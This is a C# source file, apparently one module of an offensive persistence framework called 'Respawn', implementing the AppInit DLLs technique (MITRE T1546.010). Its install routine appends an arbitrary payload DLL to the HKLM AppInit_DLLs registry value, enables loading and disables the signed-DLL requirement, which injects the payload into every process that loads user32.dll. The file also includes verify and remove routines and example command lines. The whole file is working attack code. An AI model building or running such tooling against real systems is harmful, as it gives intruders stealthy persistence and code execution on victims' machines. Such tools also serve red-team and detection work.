using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.AppInit
{
    public class AppInitModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "appinit";
        public string Name        => "AppInit DLLs";
        public string Mitre       => "T1546.010";
        public string Description => "Persist by abusing the AppInit_DLLs registry infrastructure to automatically inject a custom payload DLL into every application that loads user32.dll.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string RegPath              = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows";
        const string AppInitValue         = "AppInit_DLLs";
        const string LoadAppInitValue     = "LoadAppInit_DLLs";
        const string RequireSignedValue   = "RequireSignedAppInit_DLLs";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            // 2. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to target DLL (.dll only)");
            Console.WriteLine();

            // 3. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t appinit -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t appinit -a install -p \"C:\\p.dll\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t appinit -a verify  -p \"C:\\p.dll\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t appinit -a remove  -p \"C:\\p.dll\"");
        }

        // ─── List Options ────────────────────────────────────────────────────────

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return AppInitKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening AppInit registry key. Run as administrator.");

                string currentValue = regKey.GetValue(AppInitValue)?.ToString() ?? string.Empty;

                if (currentValue.Contains(ctx.Payload, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.Exists($"DLL '{ctx.Payload}' already present in AppInit_DLLs.");

                // append dll — space separated
                string newValue = string.IsNullOrWhiteSpace(currentValue)
                    ? ctx.Payload
                    : currentValue.TrimEnd() + " " + ctx.Payload;

                regKey.SetValue(AppInitValue,       newValue);
                regKey.SetValue(LoadAppInitValue,   1, RegistryValueKind.DWord);
                regKey.SetValue(RequireSignedValue, 0, RegistryValueKind.DWord);

                return TechniqueResult.Ok(
                    $"Installed '{ctx.Payload}' into AppInit_DLLs. " +
                    $"LoadAppInit_DLLs set to 1, RequireSignedAppInit_DLLs set to 0.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. AppInit DLLs requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening AppInit registry key. Run as administrator.");

                string currentValue = regKey.GetValue(AppInitValue)?.ToString() ?? string.Empty;

                if (!currentValue.Contains(ctx.Payload, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.NotFound($"DLL '{ctx.Payload}' not found in AppInit_DLLs.");

                // remove dll and clean up spaces
                string newValue = RemoveFromValue(currentValue, ctx.Payload);
                regKey.SetValue(AppInitValue, newValue);

                // disable loading if no more dlls
                if (string.IsNullOrWhiteSpace(newValue))
                    regKey.SetValue(LoadAppInitValue, 0, RegistryValueKind.DWord);

                return TechniqueResult.Ok($"Removed '{ctx.Payload}' from AppInit_DLLs.");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. AppInit DLLs requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (regKey == null)
                    return TechniqueResult.Denied("Access denied opening AppInit registry key. Run as administrator.");

                string currentValue = regKey.GetValue(AppInitValue)?.ToString() ?? string.Empty;
                int    loadEnabled  = (int)(regKey.GetValue(LoadAppInitValue)   ?? 0);
                int    requireSigned = (int)(regKey.GetValue(RequireSignedValue) ?? 0);

                if (!currentValue.Contains(ctx.Payload, StringComparison.OrdinalIgnoreCase))
                    return TechniqueResult.NotFound($"DLL '{ctx.Payload}' not found in AppInit_DLLs.");

                return TechniqueResult.Ok(
                    $"Verified '{ctx.Payload}' in AppInit_DLLs | " +
                    $"LoadAppInit_DLLs: {loadEnabled} | " +
                    $"RequireSignedAppInit_DLLs: {requireSigned} | " +
                    $"Full value: '{currentValue}'");
            }
            catch (UnauthorizedAccessException)
            {
                return TechniqueResult.Denied("Access denied. AppInit DLLs requires administrator privileges.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private string RemoveFromValue(string currentValue, string payload)
        {
            string result = currentValue;

            result = result.Replace(" " + payload, "", StringComparison.OrdinalIgnoreCase);
            result = result.Replace(payload + " ", "", StringComparison.OrdinalIgnoreCase);
            result = result.Replace(payload,       "", StringComparison.OrdinalIgnoreCase);

            // clean up double spaces
            while (result.Contains("  "))
                result = result.Replace("  ", " ");

            return result.Trim();
        }

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <path>.";
                return false;
            }
            if (requirePayload && !System.IO.File.Exists(ctx.Payload))
            {
                error = $"Payload not found: '{ctx.Payload}'.";
                return false;
            }
            if (requirePayload && !ctx.Payload.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            {
                error = "AppInit DLLs only supports .dll payloads.";
                return false;
            }
            error = string.Empty;
            return true;
        }
    }
}